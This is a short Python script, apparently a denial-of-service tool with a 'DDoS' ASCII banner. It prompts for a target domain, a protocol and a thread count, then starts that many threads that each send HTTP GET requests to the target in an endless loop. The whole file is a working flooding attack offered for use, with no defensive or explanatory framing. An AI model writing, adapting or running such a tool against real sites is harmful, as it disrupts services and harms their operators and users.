from colorama import Fore
import threading
import requests
 
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("[ ✔ ] Request Sent.")
        except requests.exceptions.ConnectionError:
            print("[ ! ] Server may be down.")
 
threads = 20

print(Fore.RED + """



                         ██████╗ ███████╗▄▄███▄▄·███╗   ███╗ ██████╗     ██████╗ ██████╗  ██████╗ ▄▄███▄▄·
                         ██╔══██╗██╔════╝██╔════╝████╗ ████║██╔═████╗    ██╔══██╗██╔══██╗██╔═████╗██╔════╝
                         ██║  ██║█████╗  ███████╗██╔████╔██║██║██╔██║    ██║  ██║██║  ██║██║██╔██║███████╗
                         ██║  ██║██╔══╝  ╚════██║██║╚██╔╝██║████╔╝██║    ██║  ██║██║  ██║████╔╝██║╚════██║
                         ██████╔╝███████╗███████║██║ ╚═╝ ██║╚██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
                         ╚═════╝ ╚══════╝╚═▀▀▀══╝╚═╝     ╚═╝ ╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚═▀▀▀══╝

""")

web = input("[ ? ] Enter URl | ")

while True:
    if not web.__contains__("."):
        print("[ ! ] Not a valid domain.")
        web = input("[ ? ] Enter URl | ")
    else:
        break

while True:
    choice = str(input("[ ? ] (0) http / (1) https | "))
    if choice == str(1):
        ssl = "https://"
        url = ssl + web + "/"
        break
    elif choice == str(0):
        ssl = "http://"
        url = ssl + web + "/"
        break
    else:
        print("[ ! ] Invalid answer. Please choose 0 or 1")

while True:
    try:
        threads = int(input("[ ? ] Enter Threads | "))
        if threads != 0:
            break
        else:
            print("[ ! ] Thread count is incorrect.")
    except ValueError:
        print("[ ! ] Thread count is incorrect.")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print("[ " + str(i + 1) + " ]" + " Thread Sended")
